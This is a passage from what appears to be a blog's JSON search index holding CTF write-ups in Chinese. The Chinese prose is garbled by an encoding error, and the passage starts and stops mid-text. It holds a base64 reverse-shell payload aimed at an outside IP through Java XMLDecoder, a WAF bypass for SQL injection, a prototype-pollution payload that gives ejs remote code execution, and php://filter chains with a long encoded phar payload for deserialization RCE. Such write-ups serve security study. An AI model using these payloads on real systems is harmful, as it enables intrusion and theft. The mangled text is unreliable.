index=&quot;1&quot;&gt;&lt;string&gt;-c&lt;/string&gt;&lt;/void&gt;&lt;void index=&quot;2&quot;&gt;&lt;string&gt;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjEuMzcuMTAuMjU0LzEwMDAgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&lt;/string&gt;&lt;/void&gt;&lt;/array&gt;&lt;void method=&quot;start&quot;/&gt;&lt;/object&gt;&lt;/java&gt; ç„¶åæ³¨å†Œè§¦å‘xmlè§£æå°±å¯ä»¥æ‹¿åˆ°shell 0x02 easynodeé¦–å…ˆæ˜¯ç™»å½•ï¼Œçœ‹æºç ï¼Œæ˜¯sqlæ³¨å…¥ï¼Œä½†è¿‡æ»¤å¾ˆä¸¥æ ¼ï¼Œè²Œä¼¼ä¸å¯ä»¥é€ƒé€¸å‡ºå¼•å·å®ç°æ³¨å…¥ï¼Œä½†å…¶å®è¿™é‡Œçš„wafæœ‰æ¼æ´ 123456789101112131415161718192021222324const waf = (str)=&gt;&#123; // console.log(str); blacklist = [&#x27;\\\\&#x27;,&#x27;\\^&#x27;,&#x27;)&#x27;,&#x27;(&#x27;,&#x27;\\&quot;&#x27;,&#x27;\\&#x27;&#x27;] blacklist.forEach(element =&gt; &#123; if (str == element)&#123; str = &quot;*&quot;; &#125; &#125;); return str; &#125; const safeStr = (str)=&gt;&#123; for(let i = 0;i &lt; str.length;i++)&#123; if (waf(str[i]) ==&quot;*&quot;)&#123; str = str.slice(0, i) + &quot;*&quot; + str.slice(i + 1, str.length); &#125; &#125; return str; &#125; username = safeStr(username); password = safeStr(password); let sql = format(&quot;select * from test where username = &#x27;&#123;&#125;&#x27; and password = &#x27;&#123;&#125;&#x27;&quot;,username.substr(0,20),password.substr(0,20)); wafæ˜¯æŠŠä¼ å…¥çš„usernameé€ä¸ªä¸é»‘åå•è¿›è¡Œæ¯”è¾ƒï¼Œå¯ä»¥ä¼ å…¥æ•°ç»„è¿›è¡Œç»•è¿‡ï¼Œä½†åé¢substråªèƒ½æ˜¯å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„æ•°ç»„ä¸­è¿˜å¾—å‡ºç°ä¸€æ¬¡é»‘åå•çš„å­—ç¬¦ï¼Œé€šè¿‡è¿™å¥è¯­å¥str = str.slice(0, i) + &quot;*&quot; + str.slice(i + 1, str.length);å°†ä¸€ä¸ªæ•°ç»„è½¬åŒ–æˆå­—ç¬¦ä¸² ä½†å¾—æ³¨æ„çš„æ˜¯ï¼Œsafeä¸­çš„å¾ªç¯æ¬¡æ•°æ˜¯æ ¹æ®stré•¿åº¦æ¥çš„ï¼Œsträ»æ•°ç»„å˜æˆå­—ç¬¦ä¸²ï¼Œé•¿åº¦ä¼šå‘ç”Ÿæ”¹å˜ï¼Œä¹‹åå¾ªç¯è¿˜ä¼šç»§ç»­ï¼Œæ­¤æ—¶å°±è¦ä¿è¯å¾ªç¯ç»§ç»­ä¹‹åï¼Œä¸ä¼šè¢«wafï¼Œå¯ä»¥æ‹‰é•¿æ•°ç»„é•¿åº¦ï¼Œä½¿å¾—åœ¨è½¬å˜æˆå­—ç¬¦ä¸²çš„æ—¶å€™ï¼Œiå€¼å¤Ÿå¤§ï¼Œä¸ä¼šå½±å“åˆ°æˆ‘ä»¬çš„payload 1username &#x3D; [&quot;admin&#39;#&quot;,1,1,1,1,&quot;(&quot;] post 1username[]&#x3D;admin&#39;#&amp;username[]&#x3D;1&amp;username[]&#x3D;1&amp;username[]&#x3D;1&amp;username[]&#x3D;1&amp;username[]&#x3D;(&amp;password&#x3D;xxx æ‹¿åˆ°tokenå€¼ åé¢å°±æ˜¯ä¸€ä¸ªåŸå‹é“¾æ±¡æŸ“åˆ°ejsæ¨¡å—å®ç°RCE åœ¨/adminDIVä¸‹ å‡ºç°äº†å¯æ§çš„é”®å€¼ æ³¨å†Œä¸€ä¸ªåä¸º__proto__çš„ç”¨æˆ·ï¼ˆç”¨adminçš„tokenæ³¨å†Œï¼‰ï¼Œç™»å½•æ‹¿åˆ°tokenï¼Œåœ¨/adminDIVæäº¤æ±¡æŸ“æ•°æ® 1data=&#123;&quot;outputFunctionName&quot;:&quot;a;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;);//&quot;&#125; æ±¡æŸ“åˆ°ejsä¸­çš„outputFunctionNameï¼Œåœ¨æ¸²æŸ“ä¹‹åï¼Œå¯å®ç°RCE å‚è€ƒhttps://evi0s.com/2019/08/30/expresslodashejs-%E4%BB%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%B0rce/ å›åˆ°/adminè·¯ç”±ï¼Œæ¸²æŸ“æ—¶ç›´æ¥è§¦å‘RCE","categories":[{"name":"wp","slug":"wp","permalink":"https://123-prog.github.io/categories/wp/"}],"tags":[{"name":"æ‚è®°","slug":"æ‚è®°","permalink":"https://123-prog.github.io/tags/%E6%9D%82%E8%AE%B0/"}]},{"title":"(CISCN2021 Quals)filter","slug":"CISCN2021-Quals-filter","date":"2021-08-05T02:42:14.000Z","updated":"2021-09-22T10:18:45.763Z","comments":true,"path":"2021/08/05/CISCN2021-Quals-filter/","link":"","permalink":"https://123-prog.github.io/2021/08/05/CISCN2021-Quals-filter/","excerpt":"0x01ç»™äº†siteæ§åˆ¶å™¨çš„æºç ï¼Œå°±æ”¹äº†indexæ–¹æ³•çš„é‚£ä¸€éƒ¨åˆ†","text":"0x01ç»™äº†siteæ§åˆ¶å™¨çš„æºç ï¼Œå°±æ”¹äº†indexæ–¹æ³•çš„é‚£ä¸€éƒ¨åˆ† 1234567public function actionIndex() &#123; $file = Yii::$app-&gt;request-&gt;get(&#x27;file&#x27;); $res = file_get_contents($file); file_put_contents($file,$res); return $this-&gt;render(&#x27;index&#x27;); &#125; è¯»å–æ–‡ä»¶å†…å®¹ï¼Œå†å°†è¯»å–åˆ°çš„å†…å®¹å†™åˆ°æ–‡ä»¶ä¸­ï¼Œçœ‹ä¼¼æˆ‘ä»¬æ— æ³•æ§åˆ¶å…¶ä¸­çš„å†…å®¹ï¼Œå®é™…ä¸Šå¯ä»¥é€šè¿‡php://filterè¿‡æ»¤æ•°æ®ï¼Œå†é€šè¿‡å·§å¦™åœ°æ„é€ å®ç°åœ¨æŒ‡å®šæ–‡ä»¶ä¸­å†™å…¥æƒ³è¦çš„å†…å®¹ï¼Œå…·ä½“çœ‹ä¸‹é¢ é¦–å…ˆï¼Œéœ€è¦çŸ¥é“ä¸€ä¸ªç›®æ ‡æ–‡ä»¶è·¯å¾„ æ ¹æ®æç¤º 12345678910&#x27;log&#x27; =&gt; [ &#x27;traceLevel&#x27; =&gt; YII_DEBUG ? 0 : 0, &#x27;targets&#x27; =&gt; [ [ &#x27;class&#x27; =&gt; &#x27;yii\\log\\FileTarget&#x27;, &#x27;levels&#x27; =&gt; [&#x27;error&#x27;], &#x27;logVars&#x27; =&gt; [], ], ], ], &#39;class&#39; =&gt; &#39;yii\\log\\FileTarget&#39;æŒ‡å®šæ—¥å¿—ä½¿ç”¨æ–‡ä»¶å­˜å‚¨ï¼Œæ²¡æœ‰æŒ‡å®šå­˜å‚¨ç›®æ ‡æ–‡ä»¶ï¼Œé»˜è®¤åœ¨ç›®å½• /runtime/logs/app.log ç›®æ ‡æ–‡ä»¶å°±æ˜¯è¿™ä¸ªæ—¥å¿—æ–‡ä»¶ 0x02 php://filteræ¸…ç©ºæ–‡ä»¶å†…å®¹é¦–å…ˆï¼Œæ¸…ç©ºä¸»è¦æ˜¯åˆ©ç”¨convert.base64-decodeè§£ç çš„æ—¶å€™ä¼šå…ˆå°†ébase64ç¼–ç è¡¨é‡Œé¢çš„å­—ç¬¦æ¸…é™¤ï¼Œåªè¦å°†æ—¥å¿—çš„å†…å®¹è½¬æ¢ä¸ºébase64ç¼–ç è¡¨ä¸­çš„å­—ç¬¦ï¼Œå°±å¯ä»¥å®ç°æ¸…é™¤çš„ç›®çš„ åˆ©ç”¨è½¬åŒ–ç¼–ç çš„æ–¹å¼å¯ä»¥å°†æ—¥å¿—ä¸­çš„å­—ç¬¦è½¬æ¢æˆä¸€äº›ç¼–ç å€¼è¾ƒå¤§çš„å­—ç¬¦ï¼Œè¿™äº›å­—ç¬¦ä¸ä¼šå‡ºç°åœ¨base64ç¼–ç è¡¨ä¸­ ä¸»è¦çš„filterè¿‡æ»¤æµä¸º php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../runtime/logs/app.logï¼Œé€šè¿‡file_put_contents()å°†è¯»å‡ºçš„æ•°æ®é€šè¿‡writeæµï¼ˆå¾—åˆ°ç©ºï¼‰å†å†™å…¥æ–‡ä»¶ åˆ†æï¼š convert.iconv.utf-8.utf-16beå¯ä»¥å°†å­—ç¬¦çš„ç¼–ç ä»utf-8è½¬æ¢åˆ°utf-16beï¼Œbeä»£è¡¨å¤§ç«¯åºï¼Œå¯¹åº”leä»£è¡¨å°ç«¯åºï¼Œæ¯”å¦‚ï¼Œutf-8ä¸‹çš„tå¯¹åº”74ï¼Œç»è¿‡è¿™ä¸€è½¬æ¢ï¼Œå°±å˜æˆäº†0074 convert.quoted-printable-encodeï¼Œæ‰“å°å‡ºæ‰€æœ‰å­—ç¬¦ï¼ŒåŒ…æ‹¬ä¸å¯è§å­—ç¬¦ï¼Œä¼šç©¿æ’ç­‰äºå·åœ¨å…¶ä¸­ä½œä¸ºæ ‡å¿—ï¼Œä¸ºä»€ä¹ˆè¦ç”¨è¿™ä¸ªå‘¢ï¼Œä¸‹é¢çœ‹ä¸€ä¸‹ï¼Œç»è¿‡è¿™ä¸ªæµæ‰“å°å‡ºçš„å­—ç¬¦ï¼Œå·²ç»æ²¡æœ‰ä¸å¯è§å­—ç¬¦ï¼Œè€Œä¸”è§‚å¯Ÿä¸€ä¸‹ï¼Œå¦‚æœä½œä¸ºutf-16æ¥çœ‹ï¼Œä¸¤ä¸ªå­—èŠ‚ä¸€ä¸ªå­—ç¬¦ï¼Œè¿™äº›è¡¨ç¤ºçš„å­—ç¬¦ç¼–ç å€¼éƒ½å¾ˆé«˜ï¼Œä¼šæ˜¯ä¸€äº›è¯­è¨€ç¬¦å·ï¼Œå¯èƒ½æ˜¯ä¸­æ–‡æˆ–è€…å…¶ä»–è¯­è¨€ï¼Œä½†å®ƒéƒ½ä¸ä¼šåœ¨base64ç¼–ç è¡¨é‡Œ å°†ä¸Šé¢å¾—åˆ°çš„å­—ç¬¦å†åšä¸ªç¼–ç è½¬æ¢ï¼Œå›åˆ°utf-8ï¼Œconvert.iconv.utf-16be.utf-8ï¼Œä¼šå¾—åˆ°è¿™äº›å­—ç¬¦ æœ€åbase64-decodeç›´æ¥æ¸…ç©º å…¶å®å¤šæ¬¡base64-decodeä¹Ÿæ˜¯å¯ä»¥æ¸…ç©ºçš„ 0x03 æ„é€ pharè§¦å‘ååºåˆ—åŒ–æˆ‘ä»¬å¯ä»¥åœ¨æ—¥å¿—æ§åˆ¶çš„éƒ¨åˆ†ï¼Œæ— éå°±æ˜¯æŸä¸ªä¸å­˜åœ¨çš„ç›®å½•æˆ–æ–‡ä»¶å‚æ•°ï¼Œæˆ‘ä»¬è®¿é—®è¿™ä¸ªä¸å­˜åœ¨çš„å‚æ•°ï¼Œè¿™é¢˜fileå‚æ•°å°±æ˜¯è¿™æ ·çš„å‚æ•°ï¼Œå¦‚æœç»™å‡ºä¸å­˜åœ¨çš„è·¯å¾„ï¼Œè‡ªç„¶ä¼šåœ¨æ—¥å¿—ä¸­åæ˜ å‡ºæ¥ åœ¨æœ¬åœ°æ­ä¸ªç¯å¢ƒï¼Œåˆ©ç”¨composeræ­ ç„¶åæŠŠæœ¬åœ°ç¯å¢ƒçš„é…ç½®æ”¹ä¸€ä¸‹ï¼Œæ§åˆ¶å™¨æ”¹ä¸€ä¸‹ï¼Œæ”¹æˆè·Ÿé¢˜ç›®ä¸€è‡´å°±å¯ä»¥äº† ç»™å‡ºä¸€ä¸ªä¸å­˜åœ¨å‚æ•°1&#x2F;?r&#x3D;site&#x2F;index&amp;file&#x3D;PPOOCC æ—¥å¿—ä¸­å‡ºç°ä¸€æ¡é”™è¯¯ä¿¡æ¯ æœ‰ä¸¤å¤„å¯ä»¥å‡ºç°æˆ‘ä»¬çš„payloadï¼Œä½†è¿™é‡Œçš„ç¬¬äºŒå¤„æ ˆä¿¡æ¯ä¸­ï¼Œåªä¼šæ˜¾ç¤º15ä¸ªå­—ç¬¦ï¼Œè¶…è¿‡ç›´æ¥çœç•¥å·ç»™ä½ çœç•¥äº†ï¼Œè¿™é‡Œæ˜¯ä¸€ä¸ªç‚¹éœ€è¦æ³¨æ„çš„ï¼Œè¿™é‡Œçš„çœç•¥éœ€è¦åšå¤„ç†ï¼Œå¦åˆ™æˆªæ–­åœ¨ç¬¬15ä¸ªå­—ç¬¦ï¼Œå¯èƒ½å¯¹åé¢çš„è§£ç è½¬ç é€ æˆå½±å“ ä¸‹é¢å¼€å§‹æ¶ˆé™¤æ—¥å¿—payloadå¤–çš„å…¶ä»–å­—ç¬¦ï¼Œæ–¹æ³•æ˜¯ï¼Œå¯¹payloadè¿›è¡Œç¼–ç è½¬ç åå†æ’å…¥ï¼Œç„¶ååœ¨å¯¹payloadè¿›è¡Œè¿˜åŸçš„åŒæ—¶ï¼Œæ¸…é™¤å…¶ä»–å­—ç¬¦ è¯»å–æµå¯ä»¥æ˜¯è¿™æ ·çš„ï¼š 1php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.quoted-printable-decode|convert.iconv.utf-16be.utf-8|convert.base64-decode&#x2F;resource&#x3D;..&#x2F;runtime&#x2F;logs&#x2F;app.log å¯ä»¥è¯•ä¸€ä¸‹ï¼Œç»è¿‡convert.quoted-printable-decode|convert.iconv.utf-16be.utf-8ä¼šå‡ºç°æ‰€è°“çš„ä¹±ç ï¼Œå†base64-decodeå¯ä»¥æ¸…é™¤æ—¥å¿—ä¸­çš„å…¶ä»–å†…å®¹ï¼Œæ¥ä¸‹æ¥å¤„ç†payload å¯¹payloadçš„å¤„ç†å°±æ˜¯ä¸Šé¢çš„é€†å¤„ç† 1php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode|convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode&#x2F;resource&#x3D;payload.txt æ³¨æ„è¿™é‡Œè¿˜æœ‰äº›ç»†èŠ‚è¦å¤„ç†ï¼Œå¹¶ä¸æ˜¯ç›´æ¥å°†payloadæ’è¿›å»å°±å®Œäº‹,æ³¨æ„ä»¥ä¸‹å‡ ç‚¹ æµå¤„ç†è¿‡ç¨‹ä¸­ä¸èƒ½æŠ¥é”™ï¼Œå› ä¸ºæŠ¥é”™ä¿¡æ¯ä¼šå†™è¿›æ—¥å¿—ï¼Œå¯¹æˆ‘ä»¬æ„é€ çš„pharæ–‡ä»¶é€ æˆå½±å“ 1.convert.quoted-printable-decodeï¼Œ=æ˜¯è¿™ä¸ªå¤„ç†çš„ç‰¹æ®Šç¬¦å·ï¼Œåœ¨é™¤äº†payloadè§¦å‘ç‚¹çš„å…¶ä»–åœ°æ–¹å‡ºç°ï¼Œéƒ½å¯èƒ½å¼•èµ·æŠ¥é”™ï¼Œå¦‚æœæ—¥å¿—æœ¬èº«å‡ºç°äº†=ï¼Œé‚£ä¹ˆä¼°è®¡åªèƒ½å¦ä½œè€ƒè™‘ï¼Œä¸ç”¨è¿™ä¸ªäº†ï¼Œä½†å¹¸å¥½ï¼Œæ—¥å¿—è®°å½•çš„å†…å®¹é™¤äº†æˆ‘ä»¬çš„payloadä»¥å¤–ï¼Œå¹¶æ²¡æœ‰= 2.å¯èƒ½ä½ å·²ç»æ³¨æ„åˆ°äº†ï¼Œä¸Šé¢çš„æ—¥å¿—ç¤ºä¾‹ï¼Œæœ‰ä¸¤å¤„å¯ä»¥å‡ºç°payloadï¼Œç¬¬äºŒå¤„15ä¸ªå­—ç¬¦æˆªæ–­ï¼Œå¦‚æœæˆªæ–­åœ¨=åé¢æˆ–è€…=åé¢åªç•™ä¸€ä¸ªæ•°å­—ï¼Œé‚£ä¹ˆä¹Ÿæ˜¯ä¼šæŠ¥é”™çš„ï¼Œæ‰€ä»¥è¿™é‡Œçš„å¤„ç†æ˜¯ï¼Œåœ¨payloadå‰é¢æ·»åŠ é•¿åº¦&gt;=15çš„å­—ç¬¦ä¸²ï¼Œè¿™æ ·æ—¥å¿—é‡Œé¢å°±åªæœ‰ä¸€å¤„payloadäº† 3.convert.iconv.utf-16be.utf-8ï¼Œå®ƒä¼šå°†logä¸­çš„å†…å®¹è¿›è¡Œç¼–ç è½¬æ¢ï¼Œutf-16ä»¥ä¸¤ä¸ªå­—èŠ‚ä¸ºä¸€ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥æˆ‘ä»¬logé‡Œé¢çš„å­—èŠ‚æ•°å¿…é¡»ä¸ºå¶æ•°ï¼Œä¸ç„¶ä¹Ÿä¼šæŠ¥é”™ï¼Œé™¤æ­¤ä¹‹å¤–ï¼Œæˆ‘ä»¬çš„payloadçš„ç¬¬ä¸€ä¸ªå­—èŠ‚åœ¨è½¬æ¢ç¼–ç ä¸ºutf-8çš„æ—¶å€™å¿…é¡»å’Œpayloadçš„ç¬¬äºŒä¸ªå­—èŠ‚â€œå‡‘ä¸€å¯¹â€ï¼Œè€Œä¸æ˜¯å’Œpayloadå‰é¢çš„é‚£ä¸€ä¸ªå­—ç¬¦â€œå‡‘ä¸€å¯¹â€ï¼Œæƒ³ä¸€æƒ³å°±çŸ¥é“ï¼Œç¬¬ä¸€ä¸ªå­—èŠ‚è®©æŠ¢äº†ï¼Œæˆ‘ä»¬çš„payloadå®Œæ•´æ€§ä¸å°±æ²¡äº†ï¼Œä¸å°±æ— æ³•å¤åŸäº†ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜è¦ä¿è¯payloadå‰é¢çš„å­—èŠ‚æ•°ä¸ºå¶æ•° å‰é¢çš„è¿˜å¥½ï¼Œå°±ç¬¬ä¸‰ç‚¹æ¯”è¾ƒéº»çƒ¦ï¼Œæˆ‘ä»¬å¯ä»¥è¿™æ ·æ“ä½œ å…ˆå‘é€ä¸€ä¸ªè¯·æ±‚ï¼Œåœ¨logä¸­ç•™ä¸‹ä¸€ä¸ªè®°å½•ï¼Œfile&gt;=15ï¼Œå°†ç¬¬äºŒä¸ªpayloadç‚¹å»é™¤ï¼Œæ–¹ä¾¿æˆ‘ä»¬æ§å­—èŠ‚æ•° 1?r&#x3D;site&#x2F;index&amp;file&#x3D;xxxxxxxxxxxxxxx å†å‘ä¸€ä¸ªæºå¸¦payloadçš„è¯·æ±‚ï¼Œåœ¨logä¸­ç•™ä¸‹payload 1?r&#x3D;site&#x2F;index&amp;file&#x3D;xxxxxxxxxxxxxxx%3D00P%3D00D%3D009%3D00w%3D00a%3D00H%3D00A%3D00g%3D00X%3D001%3D009%3D00I%3D00Q%3D00U%3D00x%3D00U%3D00X%3D000%3D00N%3D00P%3D00T%3D00V%3D00B%3D00J%3D00T%3D00E%3D00V%3D00S%3D00K%3D00C%3D00k%3D007%3D00I%3D00D%3D008%3D00%2B%3D00D%3D00Q%3D00q%3D00v%3D00A%3D00Q%3D00A%3D00A%3D00A%3D00g%3D00A%3D00A%3D00A%3D00B%3D00E%3D00A%3D00A%3D00A%3D00A%3D00B%3D00A%3D00A%3D00A%3D00A%3D00A%3D00A%3D00B%3D00Y%3D00A%3D00Q%3D00A%3D00A%3D00T%3D00z%3D00o%3D00z%3D00M%3D00j%3D00o%3D00i%3D00%3D0A%3D00T%3D00W%3D009%3D00u%3D00b%3D002%3D00x%3D00v%3D00Z%3D001%3D00x%3D00I%3D00Y%3D00W%3D005%3D00k%3D00b%3D00G%3D00V%3D00y%3D00X%3D00F%3D00N%3D005%3D00c%3D002%3D00x%3D00v%3D00Z%3D001%3D00V%3D00k%3D00c%3D00E%3D00h%3D00h%3D00b%3D00m%3D00R%3D00s%3D00Z%3D00X%3D00I%3D00i%3D00O%3D00j%3D00E%3D006%3D00e%3D003%3D00M%3D006%3D00O%3D00T%3D00o%3D00i%3D00A%3D00C%3D00o%3D00A%3D00c%3D002%3D009%3D00j%3D00a%3D002%3D00V%3D000%3D00I%3D00j%3D00t%3D00P%3D00O%3D00j%3D00I%3D005%3D00%3D0A%3D00O%3D00i%3D00J%3D00N%3D00b%3D002%3D005%3D00v%3D00b%3D00G%3D009%3D00n%3D00X%3D00E%3D00h%3D00h%3D00b%3D00m%3D00R%3D00s%3D00Z%3D00X%3D00J%3D00c%3D00Q%3D00n%3D00V%3D00m%3D00Z%3D00m%3D00V%3D00y%3D00S%3D00G%3D00F%3D00u%3D00Z%3D00G%3D00x%3D00l%3D00c%3D00i%3D00I%3D006%3D00N%3D00z%3D00p%3D007%3D00c%3D00z%3D00o%3D00x%3D00M%3D00D%3D00o%3D00i%3D00A%3D00C%3D00o%3D00A%3D00a%3D00G%3D00F%3D00u%3D00Z%3D00G%3D00x%3D00l%3D00c%3D00i%3D00I%3D007%3D00c%3D00j%3D00o%3D00y%3D00%3D0A%3D00O%3D003%3D00M%3D006%3D00M%3D00T%3D00M%3D006%3D00I%3D00g%3D00A%3D00q%3D00A%3D00G%3D00J%3D001%3D00Z%3D00m%3D00Z%3D00l%3D00c%3D00l%3D00N%3D00p%3D00e%3D00m%3D00U%3D00i%3D00O%3D002%3D00k%3D006%3D00L%3D00T%3D00E%3D007%3D00c%3D00z%3D00o%3D005%3D00O%3D00i%3D00I%3D00A%3D00K%3D00g%3D00B%3D00i%3D00d%3D00W%3D00Z%3D00m%3D00Z%3D00X%3D00I%3D00i%3D00O%3D002%3D00E%3D006%3D00M%3D00T%3D00p%3D007%3D00a%3D00T%3D00o%3D00w%3D00O%3D002%3D00E%3D006%3D00M%3D00j%3D00p%3D007%3D00%3D0A%3D00a%3D00T%3D00o%3D00w%3D00O%3D003%3D00M%3D006%3D00N%3D00j%3D00o%3D00i%3D00d%3D002%3D00h%3D00v%3D00Y%3D00W%3D001%3D00p%3D00I%3D00j%3D00t%3D00z%3D00O%3D00j%3D00U%3D006%3D00I%3D00m%3D00x%3D00l%3D00d%3D00m%3D00V%3D00s%3D00I%3D00j%3D00t%3D00O%3D00O%3D003%3D001%3D009%3D00c%3D00z%3D00o%3D004%3D00O%3D00i%3D00I%3D00A%3D00K%3D00g%3D00B%3D00s%3D00Z%3D00X%3D00Z%3D00l%3D00b%3D00C%3D00I%3D007%3D00T%3D00j%3D00t%3D00z%3D00O%3D00j%3D00E%3D000%3D00O%3D00i%3D00I%3D00A%3D00%3D0A%3D00K%3D00g%3D00B%3D00p%3D00b%3D00m%3D00l%3D000%3D00a%3D00W%3D00F%3D00s%3D00a%3D00X%3D00p%3D00l%3D00Z%3D00C%3D00I%3D007%3D00Y%3D00j%3D00o%3D00x%3D00O%3D003%3D00M%3D006%3D00M%3D00T%3D00Q%3D006%3D00I%3D00g%3D00A%3D00q%3D00A%3D00G%3D00J%3D001%3D00Z%3D00m%3D00Z%3D00l%3D00c%3D00k%3D00x%3D00p%3D00b%3D00W%3D00l%3D000%3D00I%3D00j%3D00t%3D00p%3D00O%3D00i%3D000%3D00x%3D00O%3D003%3D00M%3D006%3D00M%3D00T%3D00M%3D006%3D00I%3D00g%3D00A%3D00q%3D00A%3D00H%3D00B%3D00y%3D00%3D0A%3D00b%3D002%3D00N%3D00l%3D00c%3D003%3D00N%3D00v%3D00c%3D00n%3D00M%3D00i%3D00O%3D002%3D00E%3D006%3D00M%3D00j%3D00p%3D007%3D00a%3D00T%3D00o%3D00w%3D00O%3D003%3D00M%3D006%3D00N%3D00z%3D00o%3D00i%3D00Y%3D003%3D00V%3D00y%3D00c%3D00m%3D00V%3D00u%3D00d%3D00C%3D00I%3D007%3D00a%3D00T%3D00o%3D00x%3D00O%3D003%3D00M%3D006%3D00N%3D00j%3D00o%3D00i%3D00c%3D003%3D00l%3D00z%3D00d%3D00G%3D00V%3D00t%3D00I%3D00j%3D00t%3D009%3D00f%3D00X%3D000%3D00F%3D00A%3D00A%3D00A%3D00A%3D00%3D0A%3D00Z%3D00H%3D00V%3D00t%3D00b%3D00X%3D00k%3D00E%3D00A%3D00A%3D00A%3D00A%3D00Z%3D00D%3D00s%3D00N%3D00Y%3D00Q%3D00Q%3D00A%3D00A%3D00A%3D00A%3D00M%3D00f%3D00n%3D00%2F%3D00Y%3D00p%3D00A%3D00E%3D00A%3D00A%3D00A%3D00A%3D00A%3D00A%3D00A%3D00A%3D00I%3D00A%3D00A%3D00A%3D00A%3D00d%3D00G%3D00V%3D00z%3D00d%3D00C%3D005%3D000%3D00e%3D00H%3D00Q%3D00E%3D00A%3D00A%3D00A%3D00A%3D00Z%3D00D%3D00s%3D00N%3D00Y%3D00Q%3D00Q%3D00A%3D00A%3D00A%3D00A%3D00M%3D00f%3D00n%3D00%2F%3D00Y%3D00%3D0A%3D00p%3D00A%3D00E%3D00A%3D00A%3D00A%3D00A%3D00A%3D00A%3D00A%3D00B%3D000%3D00Z%3D00X%3D00N%3D000%3D00d%3D00G%3D00V%3D00z%3D00d%3D00F%3D00D%3D00o%3D00y%3D00y%3D00f%3D00f%3D00m%3D003%3D00M%3D004%3D00B%3D00r%3D001%3D00c%3D00K%3D00C%3D00e%3D001%3D008%3D007%3D00Q%3D00C%3D00M%3D00Y%3D008%3D00e%3D00A%3D00g%3D00A%3D00A%3D00A%3D00E%3D00d%3D00C%3D00T%3D00U%3D00I%3D00%3D3D%3D00%3D0A payloadå‰é¢å¯ä»¥æ’å…¥&gt;=15çš„ä»»æ„æ•°é‡çš„å­—ç¬¦ ç°åœ¨å¯ä»¥åˆ†æï¼Œå¦‚ä½•æ§å­—èŠ‚æ•°ï¼Œæˆ‘ä»¬å‘äº†ä¸¤ä¸ªè¯·æ±‚ï¼Œæ‰€ä»¥é™¤å»æˆ‘ä»¬çš„payloadéƒ¨åˆ†ï¼Œå·²ç»æ˜¯å¶æ•°äº†ï¼Œåªè¦ä¿è¯ç¬¬ä¸€æ¬¡è¯·æ±‚çš„payloadå’Œç¬¬äºŒæ¬¡è¯·æ±‚çš„payloadåŠ èµ·æ¥çš„å­—ç¬¦æ•°ä¸ºå¶æ•°å³å¯ï¼Œå°±å¯ä»¥æ»¡è¶³logä¸­å­—èŠ‚æ•°ä¸ºå¶æ•°çš„æ¡ä»¶ æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„æ˜¯ç¬¬ä¸€ä¸ªpayloadçš„é•¿åº¦ï¼Œå’Œ ç¬¬äºŒä¸ªpayloadå‰é¢å­—ç¬¦çš„é•¿åº¦ï¼Œè€Œç¬¬äºŒä¸ªpayloadæœ‰æ•ˆéƒ¨åˆ†å·²ç»æ˜¯å¶æ•°äº†ï¼Œæ‰€ä»¥ç®€åŒ–æˆç¬¬ä¸€ä¸ªpayloadåŠ ä¸Šç¬¬äºŒä¸ªpayloadå‰é¢é¢å¤–æ·»åŠ çš„å­—ç¬¦æ•°ä¸ºå¶æ•° è¿˜æœ‰ä¸€ä¸ªæ¡ä»¶ï¼Œæˆ‘ä»¬æœ‰æ•ˆpayloadå‰é¢çš„å­—èŠ‚æ•°éœ€è¦ä¸ºå¶æ•°ï¼Œåœ¨æ»¡è¶³å‰é¢æ‰€æœ‰æ¡ä»¶çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ç¬¬äºŒä¸ªpayloadé¦–å°¾å„æ·»åŠ nä¸ªå­—ç¬¦å®ç°ï¼Œè¿™æ ·æ—¢ä¸ä¼šå½±å“å…¨ä½“å¥‡å¶æ€§ï¼Œä¹Ÿå¯ä»¥æ”¹å˜æœ‰æ•ˆpayloadå‰é¢å­—ç¬¦æ•°çš„å¥‡å¶ 0x04 æ„é€ payloadè§£é¢˜ä¸‹é¢æ˜¯æœ¬åœ°æµ‹è¯•ï¼Œå®é™…åšé¢˜å¯èƒ½ç”±äºç¯å¢ƒä¸åŒéœ€è¦åšå‡ºæ”¹å˜ é¦–å…ˆæ¸…ç©ºæ—¥å¿— 1php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode&#x2F;resource&#x3D;..&#x2F;runtime&#x2F;logs&#x2F;app.log å‘å‡ºç¬¬ä¸€ä¸ªå‡ºé”™è¯·æ±‚ 1?r&#x3D;site&#x2F;index&amp;file&#x3D;xxxxxxxxxxxxxxx é€šè¿‡phpggcç”Ÿæˆpharï¼Œå†ç»è¿‡ä¸Šé¢çš„å¤„ç†å¯ä»¥è·å–æœ‰æ•ˆpayload å‘å‡ºç¬¬äºŒä¸ªå‡ºé”™è¯·æ±‚ï¼Œæ’å…¥payload 1?r&#x3D;site&#x2F;index&amp;file&#x3D;xxxxxxxxxxxxxxx%3D00P%3D00D%3D009%3D00w%3D00a%3D00H%3D00A%3D00g%3D00X%3D001%3D009%3D00I%3D00Q%3D00U%3D00x%3D00U%3D00X%3D000%3D00N%3D00P%3D00T%3D00V%3D00B%3D00J%3D00T%3D00E%3D00V%3D00S%3D00K%3D00C%3D00k%3D007%3D00I%3D00D%3D008%3D00%2B%3D00D%3D00Q%3D00q%3D00v%3D00A%3D00Q%3D00A%3D00A%3D00A%3D00g%3D00A%3D00A%3D00A%3D00B%3D00E%3D00A%3D00A%3D00A%3D00A%3D00B%3D00A%3D00A%3D00A%3D00A%3D00A%3D00A%3D00B%3D00Y%3D00A%3D00Q%3D00A%3D00A%3D00T%3D00z%3D00o%3D00z%3D00M%3D00j%3